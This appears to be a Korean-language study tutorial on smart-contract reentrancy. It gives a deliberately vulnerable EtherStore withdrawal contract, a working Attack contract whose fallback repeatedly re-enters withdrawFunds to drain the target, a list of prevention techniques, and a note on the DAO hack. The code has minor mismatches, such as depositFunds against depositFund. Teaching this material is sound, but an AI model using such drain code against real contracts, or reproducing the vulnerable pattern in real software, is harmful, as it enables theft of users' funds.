# Reentrancy 재진입성
- fallback 함수를 악용한 취약점
- fallback 함수에서 다시 출금 함수(withdrawFunds)를 호출

보안 취약 컨트랙트 : [EtherStore.sol]()
```solidity
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    //입금함수
    function depositFund() public payable {
        balances[msg.sender] += msg.value;
    }

    //출금함수
    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        require(_weiToWithdraw <= withdrawalLimit);
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);

        //변경전
        // requrie(msg.sender.calㅣ.value(_weiToWithdraw)());

        //변경후 (0.6.4 버전 이후)
        (bool success, ) = msg.sender.call {value:_weiToWithdraw}("");
        require(success, "Transfer failed.");

        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }
}
```
공격 컨트랙트 : [Attack.sol]()

```solidity
import "contracts/Reentrancy/EtherStore.sol"; //경로 주의

contract Attack {
    EtherStore public etherStore;

    // 계약자 주소(공격 대상)로 etherStore 변수를 초기화
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    } 

    //공격 함수
    function attackEtherStore() public payable {
        require(msg.value >= 1 ether);
        
        //계약자 주소(공격대상)에 1이더를 임금
        //1. depositFunds함수를 호출하여 1 이더 악성계약을 맺음
        etherStore.depositFunds{ value: 1 ether}();
        
        //출금함수 호출
        //2. 악성 계약은 withdrawFunds 출금 함수에 입금한 1이더를 요청.
        // 이전에 거래한 적이 없어 모든 조건을 통과함 (EtherStore.sol 출금조건)
        //3. 계약자가 컨트랙트라 호출 시 에러가 발생
        etherStore.withdrawFunds(1 ether);
    }
  
    function collectEther() public {
        payable(msg.sender).transfer((address(this)).balance);
    }

    //fallback function(종료시 호출)
    //4. 악성계약의 fallback 함수를 실행
    fallback() payable external{
        //계약자 주소(공격 대상)에 이더가 있을 경우 다시 출금 함수를 호출
        //5. 잔액을 비교하여 남아 있는지 확인
        if(address(etherStore).balance > 1 ether) {
            //6. 잔액이 있을 경우 다시 withdrawFunds 함수를 호출
            //7. 이 두번째 withdrawFunds 함수도 아직 실행 전이라 
            //1이더는 여전히 남아 있어 모든 요구 사항이 충족되어 모든 조건을 통과 (EtherStore.sol 출금조건)
            //8. fallback 함수는 잔액이 0 이더일 때 까지 계속 withdrawFunds 함수를 호출
            etherStore.withdrawFunds(1 ether);
        }
    }

}
```
<hr>

## 예방 기법

1. transfer 함수 호출 (권장 안함)
2. The checks-effects-interactions pattern (외부 호출 전에 값을 먼저 수정)
3. 뮤텍스 이용 (이전 호출을 종료한 후 다음 호출을 실행)
    > **뮤텍스 Mutex(Mutual Exclusion)**      
    임계구역에 들어갈 권한 검사   
    ex) `bool reEntrancyMutex = false;` 재진입 가능   
        `bool reEntrancyMutex = true;` false로 바뀔때 까지 재진입 불가능

보안 적용 컨트랙트 : [EtherStoreSecurity.sol]()
<hr>

## 실제 사례 : DAO

DAO는 이더리움 초기 개발에서 일어난 주요 해킹들 중 하나로, 당시 계약금은 1억 5000만 달러가 넘었고, 이로 인해 Ethereum Classic(ETC)이 만들어 졌음.   
DAO 사건으로 3,600,000ETH를 해킹당함


